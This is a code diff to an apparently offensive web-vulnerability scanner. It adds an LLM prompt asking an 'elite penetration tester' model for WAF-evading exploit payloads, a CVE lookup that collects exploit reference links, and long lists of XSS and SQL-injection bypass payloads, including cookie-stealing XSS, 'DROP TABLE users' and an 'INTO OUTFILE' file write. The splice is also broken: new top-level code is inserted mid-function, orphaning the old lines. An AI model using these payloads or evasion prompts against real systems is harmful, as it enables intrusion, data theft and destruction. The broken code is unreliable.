@@ -268,6 +268,273 @@ def _optimize_for_framework(payloads: list[dict[str, Any]], framework: str) -> l
     
     if not patterns:
         return payloads
+
+    def _framework_score(payload: dict[str, Any]) -> int:
+        payload_text = str(payload.get("payload", "")).lower()
+        return sum(1 for pattern in patterns if pattern.lower() in payload_text)
+
+    for payload in payloads:
+        score = _framework_score(payload)
+        if score > 0:
+            payload["priority"] = max(float(payload.get("priority", 0)), float(score))
+
+    # Preserve stable order while prioritizing framework-relevant payloads.
+    return sorted(payloads, key=_framework_score, reverse=True)
+
+
+# ============================================================================
+# AI-GENERATED PAYLOADS - FIX #2: Dynamic payload generation using LLM
+# ============================================================================
+
+async def generate_ai_payloads(
+    vuln_type: str,
+    context_dict: dict[str, Any],
+    count: int = 20,
+) -> list[dict[str, Any]]:
+    """
+    AI-powered dynamic payload generation using LLM.
+    
+    This addresses the issue that payloads are static - now we can generate
+    context-aware payloads on-the-fly based on:
+    - Target technology stack
+    - WAF type detected
+    - Failed payloads from previous attempts
+    - Latest bypass techniques
+    
+    Args:
+        vuln_type: Vulnerability type ("sqli", "xss", "rce", "ssti", "xxe", "cmd_injection")
+        context_dict: Context information as dict (from PayloadContext.to_dict())
+        count: Number of payloads to generate
+    
+    Returns:
+        List of dynamically generated payloads with metadata
+    """
+    from phantom.config.config import Config
+    from phantom.llm.llm import LLM
+    
+    # Build context prompt
+    framework = context_dict.get("framework", "unknown")
+    server = context_dict.get("server", "unknown")
+    waf_type = context_dict.get("waf_type") or "none"
+    waf_strength = context_dict.get("waf_strength", "unknown")
+    injection_context = context_dict.get("injection_context", "html")
+    failed_count = context_dict.get("failed_count", 0)
+    blocked_patterns = context_dict.get("blocked_patterns", [])
+    
+    prompt = f"""You are an elite penetration testing payload generator. Generate {count} context-aware {vuln_type} payloads.
+
+TARGET CONTEXT:
+- Framework: {framework}
+- Server: {server}
+- WAF: {waf_type} (strength: {waf_strength})
+- Injection context: {injection_context}
+- Previous failed attempts: {failed_count}
+- Blocked patterns to avoid: {blocked_patterns}
+
+REQUIREMENTS:
+1. Generate payloads that work with the detected technology stack
+2. If WAF detected ({waf_type}), include advanced bypass techniques
+3. Avoid patterns that have previously failed
+4. Cover multiple contexts (HTML, attribute, JavaScript, SQL, etc.)
+5. Include both basic and advanced/polymorphic payloads
+6. Vary payload structures to avoid pattern detection
+
+OUTPUT FORMAT (JSON array):
+[
+  {{"payload": "...", "context": "...", "bypasses": ["..."], "technique": "..."}},
+  ...
+]
+
+Generate exactly {count} payloads. Return ONLY valid JSON array, no explanation."""
+
+    try:
+        llm = LLM()
+        response = await llm.chat(
+            messages=[
+                {"role": "system", "content": "You are an elite penetration tester. Generate context-aware exploit payloads as JSON."},
+                {"role": "user", "content": prompt}
+            ],
+            max_tokens=4000
+        )
+        
+        # Parse JSON response
+        import json
+        import re
+        
+        # Try to extract JSON from response
+        json_match = re.search(r'\[.*\]', response.content, re.DOTALL)
+        if json_match:
+            payloads = json.loads(json_match.group())
+            return payloads
+        else:
+            # Try parsing whole response
+            payloads = json.loads(response.content)
+            return payloads
+            
+    except Exception as e:
+        logger.warning(f"AI payload generation failed: {e}, falling back to static")
+        return []
+
+
+# ============================================================================
+# CVE PAYLOAD AUTO-UPDATER - FIX #3: Dynamic CVE-based payloads
+# ============================================================================
+
+class CVEPayloadCache:
+    """
+    Cache for CVE-based payloads with auto-update capability.
+    Addresses the issue that payload database doesn't update with new CVEs.
+    """
+    
+    _instance = None
+    _lock = None
+    
+    def __new__(cls):
+        if cls._instance is None:
+            cls._instance = super().__new__(cls)
+            cls._instance._initialized = False
+        return cls._instance
+    
+    def __init__(self):
+        if self._initialized:
+            return
+        self._cache: dict[str, list[dict[str, Any]]] = {}
+        self._last_update: dict[str, str] = {}
+        self._update_interval_hours = 24
+        self._initialized = True
+    
+    def get(
+        self,
+        vendor: str,  # "apache", "wordpress", "nginx", etc.
+        min_cvss: float = 7.0,
+    ) -> list[dict[str, Any]]:
+        """Get cached CVE payloads for a vendor."""
+        import datetime
+        
+        cache_key = f"{vendor}:{min_cvss}"
+        
+        # Check if cache is stale
+        if cache_key in self._last_update:
+            last = datetime.datetime.fromisoformat(self._last_update[cache_key])
+            age = (datetime.datetime.now() - last).total_seconds() / 3600
+            if age < self._update_interval_hours:
+                return self._cache.get(cache_key, [])
+        
+        return []
+    
+    def update(
+        self,
+        vendor: str,
+        min_cvss: float,
+        payloads: list[dict[str, Any]],
+    ) -> None:
+        """Update cache with new CVE payloads."""
+        import datetime
+        
+        cache_key = f"{vendor}:{min_cvss}"
+        self._cache[cache_key] = payloads
+        self._last_update[cache_key] = datetime.datetime.now().isoformat()
+    
+    async def fetch_latest_cves(
+        self,
+        vendor: str,
+        min_cvss: float = 7.0,
+        max_results: int = 20,
+    ) -> list[dict[str, Any]]:
+        """Fetch latest CVEs from NVD API and convert to payloads."""
+        import httpx
+        from datetime import datetime, timedelta
+        
+        # Check cache first
+        cached = self.get(vendor, min_cvss)
+        if cached:
+            return cached
+        
+        # Fetch from NVD API
+        try:
+            async with httpx.AsyncClient(trust_env=False, timeout=30.0) as client:
+                # Calculate date range (last 90 days)
+                end_date = datetime.now()
+                start_date = end_date - timedelta(days=90)
+                
+                params = {
+                    "keywordSearch": vendor,
+                    "cvssV3Severity": "CRITICAL" if min_cvss >= 9 else "HIGH",
+                    "resultsPerPage": max_results,
+                    "startIndex": 0,
+                }
+                
+                # Get API key if available
+                api_key = Config.get("phantom_nvd_api_key")
+                headers = {"User-Agent": "Phantom-Scanner/1.0"}
+                if api_key and api_key != "NOT_SET":
+                    headers["apiKey"] = api_key
+                
+                response = await client.get(
+                    "https://services.nvd.nist.gov/rest/json/cves/2.0",
+                    params=params,
+                    headers=headers,
+                )
+                
+                if response.status_code == 403:
+                    logger.warning("NVD API rate limited - set PHANTOM_NVD_API_KEY for higher limits")
+                    return []
+                
+                data = response.json()
+                vulnerabilities = data.get("vulnerabilities", [])
+                
+                cve_payloads: list[dict[str, Any]] = []
+                
+                for vuln in vulnerabilities:
+                    cve_data = vuln.get("cve", {})
+                    cve_id = cve_data.get("id", "")
+                    
+                    # Get CVSS score
+                    cvss_score = 0.0
+                    metrics = cve_data.get("metrics", {})
+                    for key in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
+                        if key in metrics:
+                            cvss_score = metrics[key][0]["cvssData"].get("baseScore", 0.0)
+                            break
+                    
+                    if cvss_score < min_cvss:
+                        continue
+                    
+                    # Get description
+                    description = ""
+                    for desc in cve_data.get("descriptions", []):
+                        if desc.get("lang") == "en":
+                            description = desc.get("value", "")[:300]
+                            break
+                    
+                    # Get references with PoC
+                    references = cve_data.get("references", [])
+                    poc_urls = [
+                        r.get("url") for r in references
+                        if "exploit" in r.get("tags", []) or "patch" in r.get("tags", [])
+                    ][:3]
+                    
+                    cve_payloads.append({
+                        "cve_id": cve_id,
+                        "cvss": cvss_score,
+                        "description": description,
+                        "poc_urls": poc_urls,
+                        "vendor": vendor,
+                        "type": "cve_based",
+                    })
+                
+                # Update cache
+                self.update(vendor, min_cvss, cve_payloads)
+                return cve_payloads
+                
+        except Exception as e:
+            logger.warning(f"Failed to fetch CVEs for {vendor}: {e}")
+            return []
+
+
+def get_cve_payload_cache() -> CVEPayloadCache:
+    """Get singleton instance of CVE payload cache."""
+    return CVEPayloadCache()
     
     # Boost priority for payloads matching framework patterns
     for payload in payloads:
@@ -323,6 +590,56 @@ _XSS_PAYLOADS: dict[str, list[dict[str, Any]]] = {
         {"payload": "<svg/onload=alert(1)>", "context": "html", "bypasses": ["whitespace"]},
         {"payload": "<svg\tonload=alert(1)>", "context": "html", "bypasses": ["whitespace"]},
         {"payload": "<svg\nonload=alert(1)>", "context": "html", "bypasses": ["whitespace"]},
+    ],
+    # EXTENDED XSS WAF bypass - ADDED
+    "encoded_extended": [
+        # Nested tags
+        {"payload": "<scr<script>ipt>alert(1)</scr</script>ipt>", "context": "html", "bypasses": ["nested_tag"]},
+        {"payload": "<img src=x onerror=alert(1)><img src=x onerror=alert(1)>", "context": "html", "bypasses": ["double_tag"]},
+        # Case variations
+        {"payload": "<ScRiPt>alert(1)</sCrIpT>", "context": "html", "bypasses": ["case_random"]},
+        {"payload": "<SCRIPT>alert(1)</SCRIPT>", "context": "html", "bypasses": ["uppercase"]},
+        {"payload": "<script>ALERT(1)</script>", "context": "html", "bypasses": ["uppercase_content"]},
+        # Unicode variations
+        {"payload": "<img src=x onerror=\u0061lert(1)>", "context": "html", "bypasses": ["unicode_short"]},
+        {"payload": "<svg><script>alert\u00281\u0029</script></svg>", "context": "html", "bypasses": ["unicode_entity"]},
+        # Null byte variations
+        {"payload": "<script>alert\x001(1)</script>", "context": "html", "bypasses": ["null_byte_hex"]},
+        {"payload": "<scr\x00ipt>alert(1)</scr\x00ipt>", "context": "html", "bypasses": ["null_byte_mid"]},
+        # Encoding chains
+        {"payload": "<script>eval(atob('YWxlcnQoMSk='))</script>", "context": "html", "bypasses": ["base64_eval"]},
+        {"payload": "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "context": "html", "bypasses": ["base64_img"]},
+        # URL encoding
+        {"payload": "<script>alert%281%29</script>", "context": "html", "bypasses": ["url_encode_paren"]},
+        {"payload": "<img src=x onerror=alert%28document.cookie%29>", "context": "html", "bypasses": ["url_encode_cookie"]},
+        # Hex encoding
+        {"payload": "<script>alert(\x31)</script>", "context": "html", "bypasses": ["hex_escape"]},
+        {"payload": "<svg onload=alert(\x31\x31)>", "context": "html", "bypasses": ["hex_escape_multi"]},
+        # Template literals
+        {"payload": "<script>alert(`${1}`)</script>", "context": "html", "bypasses": ["template_literal"]},
+        {"payload": "<img src=x onerror=\"alert(`1`)\">", "context": "html", "bypasses": ["backtick"]},
+        # Event handler variations
+        {"payload": "<body onload=alert(1)>", "context": "html", "bypasses": ["body_onload"]},
+        {"payload": "<input onfocus=alert(1) autofocus>", "context": "html", "bypasses": ["input_autofocus"]},
+        {"payload": "<svg onload=alert(1)>", "context": "html", "bypasses": ["svg_onload"]},
+        {"payload": "<img src=x onerror=alert(1) />", "context": "html", "bypasses": ["self_closing"]},
+        # Alternative event handlers
+        {"payload": "<marquee onstart=alert(1)>", "context": "html", "bypasses": ["marquee"]},
+        {"payload": "<details open ontoggle=alert(1)>", "context": "html", "bypasses": ["details"]},
+        {"payload": "<video onerror=alert(1)>", "context": "html", "bypasses": ["video_error"]},
+        {"payload": "<audio onerror=alert(1)>", "context": "html", "bypasses": ["audio_error"]},
+        # DOM manipulation
+        {"payload": "<div onclick=alert(1)>click</div>", "context": "html", "bypasses": ["onclick"]},
+        {"payload": "<a href=javascript:alert(1)>link</a>", "context": "html", "bypasses": ["javascript_href"]},
+        {"payload": "<svg><a href=# onclick=alert(1)><rect width=100 height=100/></a></svg>", "context": "html", "bypasses": ["svg_href"]},
+        # Data URI
+        {"payload": "data:text/html,<script>alert(1)</script>", "context": "href", "bypasses": ["data_uri"]},
+        {"payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "context": "href", "bypasses": ["data_uri_base64"]},
+        # Character encoding
+        {"payload": "<script>alert(String.fromCharCode(49))</script>", "context": "html", "bypasses": ["charcode"]},
+        {"payload": "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", "context": "html", "bypasses": ["charcode_eval"]},
+        # JSFuck-style (extreme)
+        {"payload": "[][(![]+[])[!+[]+![]+![]+![]+![]+![]+![]]+(![]+[])[!+[]+![]+![]+![]+![]+![]+![]]+(![]+[])[!+[]+![]+![]+![]+![]+![]+![]]+(![]+[])[!+[]+![]+![]+![]+![]+![]+![]]]((![]+[])[!+[]+![]+![]+![]+![]+![]+![]]+(![]+[])[!+[]+![]+![]+![]+![]+![]+![]]+(![]+[])[!+[]+![]+![]+![]+![]+![]+![]]+(![]+[])[!+[]+![]+![]+![]+![]+![]+![]])()", "context": "html", "bypasses": ["jsfuck"]},
     ],
     # Polyglot payloads
     "polyglot": [
@@ -394,6 +711,67 @@ _SQLI_PAYLOADS: dict[str, list[dict[str, Any]]] = {
         {"payload": "' /*!50000OR*/ 1=1--", "db": "mysql", "type": "bypass", "bypasses": ["mysql_comment"]},
         {"payload": "' UN/**/ION SEL/**/ECT 1,2,3--", "db": "all", "type": "bypass", "bypasses": ["keyword_filter"]},
         {"payload": "' %55NION %53ELECT 1,2,3--", "db": "all", "type": "bypass", "bypasses": ["url_encode"]},
+    ],
+    # EXTENDED WAF bypass - ADDED for better coverage
+    "waf_bypass_extended": [
+        # Unicode/Encoding bypasses
+        {"payload": "'%a0UNION%a0SELECT%a01,2,3--", "db": "all", "type": "bypass", "bypasses": ["unicode_space", "utf8_bypass"]},
+        {"payload": "'%c0%a0UNION%c0%a0SELECT%c0%a01,2,3--", "db": "all", "type": "bypass", "bypasses": ["unicode_overlong"]},
+        {"payload": "1%e2%80%8bOR%e2%80%8b1=1--", "db": "all", "type": "bypass", "bypasses": ["zero_width_injection"]},
+        {"payload": "'%ffUNION%ffSELECT--", "db": "all", "type": "bypass", "bypasses": ["overlong_encoding"]},
+        {"payload": "' ｖersion()--", "db": "mysql", "type": "bypass", "bypasses": ["unicode_fullwidth"]},
+        # Comment injection variations
+        {"payload": "'/*!50000UNION*/ /*!50000ALL*/ /*!50000SELECT*/--", "db": "mysql", "type": "bypass", "bypasses": ["mysql_version_comment"]},
+        {"payload": "'/*!50000UNION*/SELECT*/1,2,3--", "db": "mysql", "type": "bypass", "bypasses": ["mysql_comment_chain"]},
+        {"payload": "'/*!50001OR*/1=1--", "db": "mysql", "type": "bypass", "bypasses": ["version_comment_different"]},
+        {"payload": "'/**/UNION/**/SELECT/**/1,2,3--", "db": "all", "type": "bypass", "bypasses": ["multi_comment"]},
+        {"payload": "'/*x*/OR/*x*/1=1--", "db": "all", "type": "bypass", "bypasses": ["inline_comment"]},
+        # Case variation bypasses  
+        {"payload": "' UnIoN SeLeCt 1,2,3--", "db": "all", "type": "bypass", "bypasses": ["case_mixing"]},
+        {"payload": "' uNiOn sElEcT 1,2,3--", "db": "all", "type": "bypass", "bypasses": ["case_random"]},
+        {"payload": "1 oR 1=1", "db": "all", "type": "bypass", "bypasses": ["case_no_comment"]},
+        # Double URL encoding
+        {"payload": "'%2527OR%25271=1--", "db": "all", "type": "bypass", "bypasses": ["double_url_encode"]},
+        {"payload": "'%252f%252a UNION SELECT%252f%252a 1,2,3--", "db": "all", "type": "bypass", "bypasses": ["double_encode_comments"]},
+        # Tab/newline variations
+        {"payload": "'%09OR%091=1--", "db": "all", "type": "bypass", "bypasses": ["tab_injection"]},
+        {"payload": "'%0aOR%0a1=1--", "db": "all", "type": "bypass", "bypasses": ["newline_injection"]},
+        {"payload": "'%0dOR%0d1=1--", "db": "all", "type": "bypass", "bypasses": ["crlf_injection"]},
+        {"payload": "'%20UNION%20SELECT%201,2,3%20--", "db": "all", "type": "bypass", "bypasses": ["encoded_space"]},
+        # Stacked query variations
+        {"payload": "1;DROP TABLE users;--", "db": "all", "type": "bypass", "bypasses": ["stacked_primitive"]},
+        {"payload": "1;SELECT SLEEP(5);--", "db": "mysql", "type": "bypass", "bypasses": ["stacked_select"]},
+        {"payload": "');SELECT SLEEP(5);--", "db": "mysql", "type": "bypass", "bypasses": ["stacked_paren"]},
+        # Hex encoding
+        {"payload": "' 0x27 OR 0x31=0x31--", "db": "mysql", "type": "bypass", "bypasses": ["hex_literal"]},
+        {"payload": "1 UNION 0x53454c454354 1,2,3--", "db": "mysql", "type": "bypass", "bypasses": ["hex_keyword"]},
+        # Char function
+        {"payload": "' CHAR(39)+CHAR(39)='1", "db": "mssql", "type": "bypass", "bypasses": ["char_function"]},
+        {"payload": "' CONCAT(CHAR(39),CHAR(39))='", "db": "all", "type": "bypass", "bypasses": ["concat_char"]},
+        # Base64 encoding (for some WAFs)
+        {"payload": "' OR '1'='1'--", "db": "all", "type": "bypass", "bypasses": ["base64_check"]},
+        # Null byte variations
+        {"payload": "'%00OR%001=1--", "db": "all", "type": "bypass", "bypasses": ["null_byte_prefix"]},
+        {"payload": "OR\x001=1", "db": "all", "type": "bypass", "bypasses": ["null_byte_mid"]},
+        {"payload": "1\x00OR\x001=1", "db": "all", "type": "bypass", "bypasses": ["null_byte_no_space"]},
+        # Parameter pollution
+        {"payload": "id=1&id=1' OR '1'='1", "db": "all", "type": "bypass", "bypasses": ["parameter_pollution"]},
+        {"payload": "id=1' OR 1=1--&id=2", "db": "all", "type": "bypass", "bypasses": ["parameter_override"]},
+        # JSON pollution
+        {"payload": "{\"id\":1,\"id\": \"1' OR '1'='1\"}", "db": "all", "type": "bypass", "bypasses": ["json_duplicate_key"]},
+        # Type casting bypass
+        {"payload": "' OR 1=1 ORDER BY 1--", "db": "all", "type": "bypass", "bypasses": ["order_by_injection"]},
+        {"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '/tmp/pwned'--", "db": "mysql", "type": "bypass", "bypasses": ["file_write"]},
+        # Scientific notation
+        {"payload": "1e0OR1e0=1e0", "db": "all", "type": "bypass", "bypasses": ["scientific_notation"]},
+        # Float bypass
+        {"payload": "1.1OR1.1=1.1", "db": "all", "type": "bypass", "bypasses": ["float_literal"]},
+        # Boolean logic variations
+        {"payload": "1 || 1=1", "db": "all", "type": "bypass", "bypasses": ["double_pipe"]},
+        {"payload": "1 && 1=1", "db": "all", "type": "bypass", "bypasses": ["double_ampersand"]},
+        # Like operator bypass
+        {"payload": "' OR ''='", "db": "all", "type": "bypass", "bypasses": ["empty_string"]},
+        {"payload": "' OR 'x'='x", "db": "all", "type": "bypass", "bypasses": ["self_reference"]},
     ],
 }
 
@@ -1190,6 +1568,16 @@ def _generate_waf_sqli_bypasses(waf_type: str, db_type: str) -> list[dict[str, A
             "db": db_type if db_type != "all" else "all",
             "type": "bypass",
             "bypasses": [waf_type.lower()],
+        })
+    
+    # ADD: Include extended WAF bypass payloads
+    for payload_entry in _SQLI_PAYLOADS.get("waf_bypass_extended", []):
+        bypasses.append({
+            "payload": payload_entry["payload"],
+            "category": "waf_bypass_extended",
+            "db": payload_entry.get("db", "all"),
+            "type": "bypass",
+            "bypasses": payload_entry.get("bypasses", []),
         })
     
     return bypasses
